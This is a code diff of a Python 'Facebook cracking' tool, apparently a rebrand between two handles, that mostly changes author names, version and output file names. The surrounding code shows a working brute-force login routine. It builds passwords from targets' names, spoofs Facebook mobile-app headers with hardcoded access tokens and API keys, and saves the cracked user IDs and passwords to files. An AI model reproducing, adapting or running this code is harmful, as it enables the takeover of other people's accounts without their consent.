@@ -1,4 +1,4 @@
-#SC OWNER_______________SATAN
+#SC OWNER_______________SHVNI
 
 from ast import Pass
 from os import name, path
@@ -330,7 +330,7 @@ logo=("""\033[1;37m
 \033[1;37m-----------------------------------------------
 \033[1;37m AUTHOR    : SHVNI\033[92;1m•
 \033[1;37m GITHUB    : SHVNI-404\033[92;1m
-\033[1;37m VERSION   : \033[92;1m3\033[92;1m.\033[92;1m4 
+\033[1;37m VERSION   : \033[92;1m5\033[92;1m.\033[92;1m0
 \033[1;37m═══════════════════════════════════════════════
 \033[92;1m  HI SW WELCOME MY TOOLS
 \033[92;1m  FACEBOOK CRACKING TOOLS
@@ -381,7 +381,7 @@ key = 'true'
 while key == 'true':
     username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
     if username == CorrectUsername:
-            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m LOGGED IN SHVNI TOOL ENJOY') 
+            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m LOGGED IN SATAN TOOL SUCCESSFULLY') 
             time.sleep(1)
             clear()
             key = 'false'
@@ -863,7 +863,7 @@ def newidx(ids,names,passlist):
 			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 			head = {"User-Agent": S1(),"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),"X-FB-Connection-Type": "MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
 			data =  {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "register_api","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "NO_FILE","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_PK","client_country_code": "PK","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-			po = requests.post('https://m.facebook.com/auth/login',data=data,headers=head).json()
+			po = requests.post('https://mbasic.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
 				uid = str(po['uid'])
 				print('\r\r\033[1;32m [SHVNI-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
@@ -877,7 +877,7 @@ def newidx(ids,names,passlist):
 			elif 'www.facebook.com' in po['error']['message']:
 				uid = str(po['error']['error_data']['uid'])
 				#print(f'\r\r\033[1;33m [SATAN-CP] '+uid+' | '+pas+'\033[1;97m')
-				open('/sdcard/SHVI-CP.txt','a').write(uid+'|'+pas+'\n')
+				open('/sdcard/SATAN-CP.txt','a').write(uid+'|'+pas+'\n')
 				cps.append(uid)
 				break
 			else:
